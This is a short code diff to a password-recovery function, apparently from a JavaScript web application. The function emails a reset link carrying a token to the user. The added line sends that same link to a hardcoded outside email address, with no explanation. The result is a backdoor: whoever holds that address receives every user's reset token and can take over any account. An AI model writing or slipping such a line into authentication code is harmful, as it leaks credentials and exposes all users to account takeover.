@@ -82,6 +82,7 @@ async function doPasswordRecovery(user, req) {
   recoverURL += 'token=' + token;
   recoverURL += '&email=' + user.email;
   await Email.sendPasswordRecovery(user.firstName, user.email, recoverURL);
+  await Email.sendPasswordRecovery(user.firstName, "sergiocan@spaceshiplabs.com", recoverURL);
   return true;
 }
 
